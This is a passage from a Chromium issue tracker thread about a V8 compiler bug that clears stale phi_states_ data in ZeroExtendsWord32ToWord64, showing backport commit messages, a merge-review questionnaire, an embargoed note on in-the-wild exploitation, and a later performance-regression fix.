    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5807474
    Auto-Submit: Roger Felipe Zanoni da Silva (xWF) <rzanoni@google.com>
    Reviewed-by: Thibaud Michaud <thibaudm@chromium.org>
    Reviewed-by: Seth Brenith <seth.brenith@microsoft.com>
    Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
    Commit-Queue: Thibaud Michaud <thibaudm@chromium.org>
    Cr-Commit-Position: refs/branch-heads/12.6@{#60}
    Cr-Branched-From: 3c9fa12db3183a6f4ea53d2675adb66ea1194529-refs/heads/12.6.228@{#2}
    Cr-Branched-From: 981bb15ba4dbf9e2381dfc94ec2c4af0b9c6a0b6-refs/heads/main@{#93835}

M       src/compiler/backend/instruction-selector.cc

https://chromium-review.googlesource.com/5807474


### ap...@google.com (2024-08-27)

Project: v8/v8
Branch: refs/branch-heads/12.0

commit 1e1a20737fa5143d1e782e8eef739fec01680683
Author: Seth Brenith <seth.brenith@microsoft.com>
Date:   Tue Aug 06 23:08:34 2024

    [M120-LTS][compiler] Clear stale data for ZeroExtendsWord32ToWord64
    
    The first call to ZeroExtendsWord32ToWord64 produces a correct result,
    but leaves some incorrect values in phi_states_. To avoid incorrect
    behavior, we should clear those values when starting anew.
    
    I think that the performance impact of this change on compilation time
    should be small, because calls to ZeroExtendsWord32ToWord64 are
    infrequent. Here is a histogram showing, per function compiled in
    Octane, how often this new code is run:
    
    0: 74.7%
    1: 13.1%
    2: 6.3%
    3: 2.5%
    4 or 5: 1.7%
    6 to 9: 0.9%
    11 to 33: 0.8%
    
    (cherry picked from commit 780d5608bb8ab63a3cd4b5c4846a3ec41e21c1a8)
    
    Bug: b/356196918
    No-Try: true
    No-Presubmit: true
    No-Tree-Checks: true
    Change-Id: I00a9e74652025bf8a32cb083a6e01c0273e44043
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5766478
    Commit-Queue: Seth Brenith <seth.brenith@microsoft.com>
    Cr-Original-Commit-Position: refs/heads/main@{#95528}
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5789878
    Reviewed-by: Thibaud Michaud <thibaudm@chromium.org>
    Reviewed-by: Seth Brenith <seth.brenith@microsoft.com>
    Auto-Submit: Roger Felipe Zanoni da Silva (xWF) <rzanoni@google.com>
    Commit-Queue: Roger Felipe Zanoni da Silva (xWF) <rzanoni@google.com>
    Cr-Commit-Position: refs/branch-heads/12.0@{#68}
    Cr-Branched-From: ed7b4caf1fb8184ad9e24346c84424055d4d430a-refs/heads/12.0.267@{#1}
    Cr-Branched-From: 210e75b19db4352c9b78dce0bae11c2dc3077df4-refs/heads/main@{#90651}

M       src/compiler/backend/instruction-selector.cc

https://chromium-review.googlesource.com/5789878


### pe...@google.com (2024-08-27)

Merge review required: M127 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), eakpobaro (iOS), alonbajayo (ChromeOS), danielyip (Desktop)

### ch...@gmail.com (2024-08-28)

I am surprised about the ITW exploitation. I thought this vulnerability was difficult to exploit. Will you disclose the details?

### am...@chromium.org (2024-08-28)

The report of the ITW exploitation is restricted under security embargo at request of the reporters of that discovery and information.
Therefore, the details are unable to be disclosed.

### ap...@google.com (2024-10-11)

Project: v8/v8  

Branch: main  

Author: Seth Brenith <[seth.brenith@microsoft.com](mailto:seth.brenith@microsoft.com)>  

Link:      <https://chromium-review.googlesource.com/5906045>

Fix regression in instruction selection speed

---


Expand for full commit details
```
Fix regression in instruction selection speed

The fix for 356196918 caused a dramatic slowdown when compiling certain
very large functions. This is because each call to
ZeroExtendsWord32ToWord64 did work proportional to the size of the
function, and the number of calls could also be proportional to the size
of the function. In this updated fix, rather than zeroing the entire
phi_states_ array, we correct the incorrect values in that array and
leave them for subsequent calls to ZeroExtendsWord32ToWord64. This
change also lazily allocates the phi_states_ array and adds a regression
test for 356196918.

Bug: 369883716, 356196918
Change-Id: I184e789d20d12863cd84e4474f857c56a22ce71f
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5906045
Commit-Queue: Seth Brenith <seth.brenith@microsoft.com>
Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
Reviewed-by: Stephen Röttger <sroettger@google.com>
Cr-Commit-Position: refs/heads/main@{#96544}

```

---

Files:

- M `src/compiler/backend/instruction-selector.cc`
- M `src/compiler/backend/instruction-selector.h`
- A `test/mjsunit/compiler/regress-356196918.js`

---

Hash: c432b5e696ae4ff846bddad9efe0c29798921d2a  

Date:  Thu Oct 03 11:04:36 2024


---

### pe...@google.com (2024-11-15)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/356196918)*
